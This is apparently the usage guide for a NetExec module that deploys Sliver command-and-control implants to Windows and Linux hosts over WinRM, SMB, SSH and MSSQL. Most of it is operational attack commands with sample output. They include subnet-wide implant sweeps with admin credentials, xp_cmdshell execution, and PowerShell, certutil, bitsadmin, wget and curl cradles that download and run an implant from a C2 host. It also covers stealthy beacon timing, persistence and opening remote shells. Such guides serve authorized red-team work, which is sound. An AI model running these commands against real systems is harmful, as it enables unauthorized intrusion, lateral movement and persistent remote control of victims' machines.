# Usage Guide

## Table of Contents

- [Prerequisites](#prerequisites)
- [Basic Usage - Direct Implant Upload](#basic-usage---direct-implant-upload)
- [HTTP Download Staging](#http-download-staging)
- [Advanced Options](#advanced-options)
- [Troubleshooting](#troubleshooting)

---

## Prerequisites

### Required Setup

1. **Sliver Server Running:**
   ```bash
   # Start Sliver server
   sliver-server
   
   # In another terminal, connect as operator
   sliver-client
   ```

2. **Sliver Client Config:**
   ```bash
   # Copy operator config to default location
   cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
   ```

3. **NetExec with sliver_exec Module:**
   ```bash
   # Verify module is installed
   nxc smb -L | grep sliver_exec
   ```

4. **Valid Credentials for Target:**
   - Windows: Local admin or domain admin credentials
   - Linux: SSH key or root/sudo credentials

---

## Basic Usage - Direct Implant Upload

The simplest deployment mode - uploads the full implant binary to the target and executes it.

### Example 1: Single Windows Target via WinRM

```bash
nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5
```

**What happens:**
1. NetExec connects to `192.168.1.10` via WinRM
2. Module generates unique Sliver implant (Windows/amd64, mTLS beacon)
3. Implant configured to call back to `10.0.0.5:443` (Sliver mTLS listener, default port)
4. Implant uploaded to `C:\Windows\Temp\` via WinRM
5. Implant executed on target
6. Module waits 90 seconds for beacon callback
7. Implant file deleted from target (CLEANUP_MODE=always by default)

**Note:** `RPORT` defaults to 443 if not specified. To use a different port, add `RPORT=8888`.

**Expected output:**
```
WINRM       192.168.1.10    5985   TARGET01  [*] Generating Sliver implant: SUBTLE_REFRIGERATOR
WINRM       192.168.1.10    5985   TARGET01  [+] Implant generated: 17.2 MB
WINRM       192.168.1.10    5985   TARGET01  [*] Uploading implant to C:\Windows\Temp\SUBTLE_REFRIGERATOR.exe
WINRM       192.168.1.10    5985   TARGET01  [*] Executing implant...
WINRM       192.168.1.10    5985   TARGET01  [*] Waiting up to 90 seconds for beacon...
WINRM       192.168.1.10    5985   TARGET01  [+] Beacon registered: SUBTLE_REFRIGERATOR
WINRM       192.168.1.10    5985   TARGET01  [+] Cleaned up implant file
```

### Example 2: Multiple Windows Targets via SMB

```bash
nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
  -M sliver_exec \
  -o RHOST=192.168.1.100
```

**Note:** Port 443 is used by default. For other ports, specify `RPORT=<port>`.

**What happens:**
1. NetExec scans `10.2.10.0/24` subnet for SMB targets
2. For each accessible target:
   - Detects OS/architecture from SMB connection metadata
   - Generates unique implant tailored to target
   - Uploads via `C$` share to `C:\Windows\Temp\`
   - Executes via scheduled task
   - Waits for beacon callback
   - Cleans up artifacts

**Expected output:**
```
SMB         10.2.10.15      445    WORKSTATION1  [*] Generating Sliver implant: ANCIENT_BICYCLE
SMB         10.2.10.15      445    WORKSTATION1  [+] Implant generated: 17.2 MB
SMB         10.2.10.15      445    WORKSTATION1  [*] Uploading via SMB to C:\Windows\Temp\
SMB         10.2.10.15      445    WORKSTATION1  [*] Executing via scheduled task...
SMB         10.2.10.15      445    WORKSTATION1  [+] Beacon registered: ANCIENT_BICYCLE
SMB         10.2.10.23      445    SERVER2       [*] Generating Sliver implant: HAPPY_KEYBOARD
SMB         10.2.10.23      445    SERVER2       [+] Beacon registered: HAPPY_KEYBOARD
...
```

### Example 3: Linux Target via SSH

```bash
nxc ssh 192.168.1.50 -u root -p 'toor' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 OS=linux ARCH=amd64
```

**Note:** Default port 443 is used for mTLS.

**What happens:**
1. Connects via SSH to Linux target
2. Generates Linux ELF implant (manually specified OS/ARCH)
3. Uploads to `/tmp/` via SFTP
4. Executes with `chmod +x && ./implant &`
5. Waits for beacon callback
6. Removes implant file

**Expected output:**
```
SSH         192.168.1.50    22     linuxbox      [*] Generating Sliver implant: BLUE_MOUNTAIN (linux/amd64)
SSH         192.168.1.50    22     linuxbox      [+] Implant generated: 16.8 MB
SSH         192.168.1.50    22     linuxbox      [*] Uploading to /tmp/BLUE_MOUNTAIN
SSH         192.168.1.50    22     linuxbox      [*] Executing implant...
SSH         192.168.1.50    22     linuxbox      [+] Beacon registered: BLUE_MOUNTAIN
```

### Example 4: MSSQL Target (Windows)

```bash
nxc mssql 192.168.1.100 -u sa -p 'SqlAdmin123!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5
```

**What happens:**
1. Connects to MSSQL server
2. Uses `xp_cmdshell` to write implant to disk
3. Executes implant via `xp_cmdshell`
4. Waits for beacon and cleans up

---

## HTTP Download Staging

Lightweight deployment mode where the target downloads the implant from a Sliver-hosted HTTP server.

### Example 1: PowerShell Method (Default, Most Reliable)

```bash
nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 \
     STAGING=http STAGING_PORT=8080
```

**What happens:**
1. Module generates full implant EXE (~17MB)
2. Sliver hosts implant at `http://10.0.0.5:8080/SUBTLE_REFRIGERATOR.exe`
3. Tiny PowerShell download cradle executed on target (~200 bytes):
   ```powershell
   $w=New-Object Net.WebClient;
   $w.DownloadFile('http://10.0.0.5:8080/SUBTLE_REFRIGERATOR.exe','C:\Windows\Temp\i.exe');
   Start-Process 'C:\Windows\Temp\i.exe'
   ```
4. Target downloads implant from Sliver HTTP server
5. Target executes downloaded implant
6. Beacon calls back to mTLS listener (`10.0.0.5:443`, default)
7. Module removes website and stops HTTP listener
8. Implant file deleted from target

**Note:** 
- `DOWNLOAD_TOOL` defaults to `powershell` for WinRM if not specified (protocol-specific: MSSQL defaults to `certutil`, SMB Windows defaults to `powershell`)
- `STAGER_RHOST` defaults to `RHOST` (same server for staging and C2)
- Final C2 callback uses default port 443 unless `RPORT` is specified

**Expected output:**
```
WINRM       192.168.1.10    5985   TARGET01  [*] Generating Sliver implant: SUBTLE_REFRIGERATOR
WINRM       192.168.1.10    5985   TARGET01  [+] Implant generated: 17.2 MB
WINRM       192.168.1.10    5985   TARGET01  [*] Starting HTTP staging server at 10.0.0.5:8080
WINRM       192.168.1.10    5985   TARGET01  [*] Hosting implant at http://10.0.0.5:8080/SUBTLE_REFRIGERATOR.exe
WINRM       192.168.1.10    5985   TARGET01  [*] HTTP staging: 10.0.0.5:8080
WINRM       192.168.1.10    5985   TARGET01  [*] Staging method: powershell
WINRM       192.168.1.10    5985   TARGET01  [*] Final C2: 10.0.0.5:8888 (mTLS)
WINRM       192.168.1.10    5985   TARGET01  [*] Executing download cradle (220 bytes)
WINRM       192.168.1.10    5985   TARGET01  [*] Waiting up to 120 seconds for beacon...
WINRM       192.168.1.10    5985   TARGET01  [+] Beacon registered: SUBTLE_REFRIGERATOR
WINRM       192.168.1.10    5985   TARGET01  [+] Removed staging website
WINRM       192.168.1.10    5985   TARGET01  [+] Stopped HTTP listener (Job ID: 3)
```

**Network traffic:**
- NetExec → Target: ~220 bytes (PowerShell command)
- Target → Sliver HTTP: ~17MB download (target-initiated)
- Target → Sliver mTLS: Beacon traffic

### Example 2: Certutil Method (Classic LOLBin)

```bash
nxc smb 192.168.1.0/24 -u admin -p 'SecurePass123' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=certutil
```

**What happens:**
1-2. Same as PowerShell method (generate + host implant)
3. Certutil download command executed on target:
   ```cmd
   certutil -urlcache -split -f http://10.0.0.5:8080/ANCIENT_BICYCLE.exe %TEMP%\i.exe && %TEMP%\i.exe
   ```
4-8. Same as PowerShell method

**Use case:** Older Windows systems or when PowerShell execution is restricted.

### Example 3: BITSAdmin Method (Alternative Transfer)

```bash
nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=bitsadmin
```

**What happens:**
1-2. Same as PowerShell method
3. BITSAdmin command executed on target:
   ```cmd
   bitsadmin /transfer sliverJob http://10.0.0.5:8080/SUBTLE_REFRIGERATOR.exe %TEMP%\i.exe && %TEMP%\i.exe
   ```
4-8. Same as PowerShell method

**Use case:** Background transfer, potentially less noisy than direct WebClient usage.

### Example 4: Custom Port HTTP Staging

```bash
nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=http STAGING_PORT=9090 DOWNLOAD_TOOL=powershell
```

**Note:** HTTP staging currently uses HTTP only. HTTPS support is planned for a future release.

### Example 5: Linux HTTP Staging (wget/curl/python)

HTTP staging also works for Linux targets using wget, curl, or python download methods:

```bash
# Using wget (most common)
nxc ssh 192.168.1.50 -u root -p 'toor' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=wget

# Using curl
nxc ssh 192.168.1.50 -u root -p 'toor' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=curl

# Using python (if wget/curl unavailable)
nxc ssh 192.168.1.50 -u root -p 'toor' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=python
```

**What happens:**
1. Module generates unique Linux ELF implant
2. Hosts implant on Sliver HTTP server (port 8080)
3. Executes download cradle on Linux target (~250 bytes):
   - **wget**: `wget -q -O /tmp/implant URL && chmod +x && nohup ./implant &`
   - **curl**: `curl -s -o /tmp/implant URL && chmod +x && nohup ./implant &`
   - **python**: `python3 -c "import urllib.request; ..." && chmod +x && nohup ./implant &`
4. Target downloads ELF implant from HTTP server
5. Beacon connects back to mTLS listener
6. Cleans up HTTP server and website

**Use case:** Linux targets with limited tools available, or when direct upload might be detected.

### Example 6: Multi-Target HTTP Staging

```bash
nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
  -M sliver_exec \
  -o RHOST=192.168.1.100 \
     STAGING=http STAGING_PORT=8080
```

**Note:** `DOWNLOAD_TOOL` defaults to `powershell` for SMB Windows if not specified (protocol-specific: MSSQL defaults to `certutil`, WinRM defaults to `powershell`)

**What happens:**
- Each target gets a **unique implant** hosted on the same HTTP server
- Separate website per target (e.g., `staging_ANCIENT_BICYCLE`, `staging_HAPPY_KEYBOARD`)
- Each target downloads its specific implant
- HTTP listener and websites cleaned up after all beacons register

---

## Advanced Options

### Complete Option Reference

| Option | Default | Description |
|--------|---------|-------------|
| `RHOST` | **Required*** | Sliver server IP for final C2 mTLS listener |
| `RPORT` | `443` | Sliver mTLS listener port (optional) |
| `BEACON_INTERVAL` | `5` | Beacon callback interval in seconds |
| `BEACON_JITTER` | `3` | Beacon callback jitter in seconds |
| `OS` | Auto-detect | Target OS (`windows` or `linux`) |
| `ARCH` | `amd64` | Target architecture (`amd64` or `386`) |
| `IMPLANT_BASE_PATH` | `/tmp` | Local temp directory for implant generation |
| `CLEANUP_MODE` | `always` | When to cleanup: `always`, `success` (only if beacon registers), or `never` |
| `WAIT` | `90` | Seconds to wait for beacon callback |
| `FORMAT` | `exe` | Implant format (only `exe` supported currently) |
| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
| `STAGER_RHOST` | `RHOST` | Stager listener IP (defaults to same as RHOST) |
| `STAGER_RPORT` | `RPORT` | Stager listener port (defaults to same as RPORT) |
| `STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
| `DOWNLOAD_TOOL` | Protocol-specific | Download method - Windows: `powershell`, `certutil`, `bitsadmin`; Linux: `wget`, `curl`, `python`. Defaults: MSSQL→`certutil`, SMB Windows→`powershell`, WinRM→`powershell` |
| `PROFILE` | None | Use existing Sliver profile instead of generating new implant |
| `SHARE` | `C$` | SMB share for file upload (SMB protocol only) |

*\* Either `RHOST` or `PROFILE` must be provided*

**Backward Compatibility:** Old option names are still supported:
- `STAGER_PORT` → Use `STAGING_PORT` (new)
- `STAGING_METHOD` → Use `DOWNLOAD_TOOL` (new)
- `STAGING=True` + `STAGER_PROTOCOL=http` → Use `STAGING=http` (new)

### Using Sliver Profiles

Profiles allow pre-configured implant settings for consistent deployments.

**Create profile in Sliver:**
```bash
sliver > profiles new --mtls 10.0.0.5:8888 --os windows --arch amd64 --format exe corp_profile
```

**Use profile with NetExec:**
```bash
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o PROFILE=corp_profile
```

**Benefits:**
- Consistent C2 configuration across deployments
- No need to specify RHOST/RPORT (read from profile)
- Can include advanced options (jitter, reconnect intervals, etc.)

### Custom Implant Base Path

```bash
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 IMPLANT_BASE_PATH=/opt/implants
```

**Note:** Explicitly specify `RPORT` when using non-default ports.

**Use case:** Store generated implants in specific directory for forensics/analysis.

### Cleanup Modes

Control when artifacts are removed from the target system:

#### Always Cleanup (Default)
```bash
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 CLEANUP_MODE=always
```

Removes implant file and staging artifacts regardless of beacon registration success.

#### Cleanup Only on Success
```bash
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 CLEANUP_MODE=success
```

Only removes artifacts if the beacon successfully registers with the C2 server.

**Use case:** 
- Troubleshooting deployment failures (failed implants remain on disk for analysis)
- Reduces noise from failed deployments
- Forensic analysis of execution issues

#### Never Cleanup
```bash
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 CLEANUP_MODE=never
```

Keeps implant on disk for persistence or re-execution.

**Use case:** 
- Persistence (implant remains on disk)
- Forensic analysis of deployed binary
- Re-execution without re-upload

### Extended Wait Time

```bash
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 WAIT=300
```

**Use case:**
- Slow networks
- Large subnet scans where beacons may be delayed
- High-latency C2 connections

### Custom Beacon Timing

```bash
# Stealthy beacon with longer interval (60s callback, 30s jitter)
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 BEACON_INTERVAL=60 BEACON_JITTER=30

# Fast beacon for quick interactions (1s callback, 0s jitter)
nxc winrm 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 BEACON_INTERVAL=1 BEACON_JITTER=0
```

**Use case:**
- Stealth operations: longer intervals reduce network noise
- Red team assessments: faster callbacks for interactive sessions
- Custom C2 profiles: match specific operational requirements

**Note:** Default is 5s interval with 3s jitter (callbacks every 2-8 seconds)

### Force Specific OS/Architecture

```bash
# Force 32-bit Windows implant
nxc smb 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 OS=windows ARCH=386

# Force Linux ARM64
nxc ssh 192.168.1.50 -u root -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=443 OS=linux ARCH=arm64
```

**Use case:**
- Auto-detection fails
- Mixed architecture environment (e.g., WoW64)
- Embedded/IoT Linux targets

### Custom SMB Share

```bash
nxc smb 192.168.1.10 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 SHARE=ADMIN$
```

**Use case:** Non-standard share configuration or specific upload path requirements.

---

## Example Workflows

### Workflow 1: Internal Network Sweep

**Scenario:** Scan internal subnet for Windows hosts, deploy beacons to all accessible targets.

```bash
# 1. Start Sliver server and mTLS listener
sliver-server
sliver-client
sliver > mtls -l 0.0.0.0 -p 443

# 2. Scan and deploy
nxc smb 10.2.10.0/24 -u 'CORP\admin' -p 'P@ssw0rd!' \
  -M sliver_exec \
  -o RHOST=192.168.1.100 WAIT=60

# 3. Interact with beacons
sliver > beacons
sliver > use <beacon_id>
sliver (SUBTLE_REFRIGERATOR) > info
sliver (SUBTLE_REFRIGERATOR) > shell
```

### Workflow 2: Targeted HTTP Staging Deployment

**Scenario:** Deploy to single high-value target using lightweight HTTP staging.

```bash
# 1. Start Sliver mTLS listener
sliver > mtls -l 0.0.0.0 -p 8888

# 2. Deploy with HTTP staging
nxc winrm 192.168.1.50 -u Administrator -p 'SecurePass!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=True STAGER_PORT=8080 \
     WAIT=120

# 3. Verify beacon and cleanup occurred
sliver > beacons
sliver > jobs  # HTTP listener should be stopped
sliver > websites  # Website should be removed
```

### Workflow 3: Cross-Platform Deployment

**Scenario:** Deploy to mixed Windows/Linux environment.

```bash
# Windows targets via SMB
nxc smb 10.2.10.0/24 -u admin -p pass \
  -M sliver_exec \
  -o RHOST=192.168.1.100

# Linux targets via SSH
nxc ssh 10.2.20.0/24 -u root -p pass \
  -M sliver_exec \
  -o RHOST=192.168.1.100 OS=linux

# Check all beacons
sliver > beacons
```

**Note:** Using default port 443 for both Windows and Linux beacons.
